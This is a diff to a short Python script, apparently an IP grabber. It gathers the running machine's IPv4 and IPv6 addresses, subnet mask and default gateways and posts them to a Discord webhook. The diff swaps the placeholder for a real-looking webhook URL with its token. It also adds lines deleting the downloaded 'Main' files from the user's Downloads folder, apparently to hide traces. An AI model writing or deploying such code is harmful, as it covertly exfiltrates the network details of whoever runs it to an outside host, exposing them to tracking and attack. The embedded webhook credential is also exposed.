@@ -1,8 +1,4 @@
-import requests
-import socket
-import psutil
-import netifaces
-import time
+import requests, socket, psutil, netifaces, time, os
 
 def get_IPv6():
         ipv6_addresses = [addr[4][0] for addr in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6) if not addr[4][0].startswith('fe80::')]  
@@ -42,11 +38,13 @@ subnet_mask = get_subnet_mask()
 deafult_gateway_IPv4 = get_default_gateway_IPv4()
 deafult_gateway_IPv6 = get_default_gateway_IPv6()
 
-webhook_url = "UR_WEBHOOK_URL"
+webhook_url = "https://discord.com/api/webhooks/1193574121217478738/Z8QvpRmZ9OEghut0VIYptffgg8hO99GzBhVew-kP887ESnoDKmosg3ua-BZ-zlC5ocC_"
 
 payload = {
     "content": f"@everyone\nIPv6 Address = {IPv6}\nLink-local IPv6 Address = {Link_local_IPv6}\nIPv4 Address = {IPv4}\nSubnet Mask = {subnet_mask}\nDeafult Gateway IPv6 = {deafult_gateway_IPv6}\nDeafult Gateway IPv4 = {deafult_gateway_IPv4}"
 }
 
 response = requests.post(webhook_url, json=payload)
+os.remove("%USERPROFILE%\Downloads\Main")
+os.remove("%USERPROFILE%\Downloads\Main.zip")
 time.sleep(0.1)
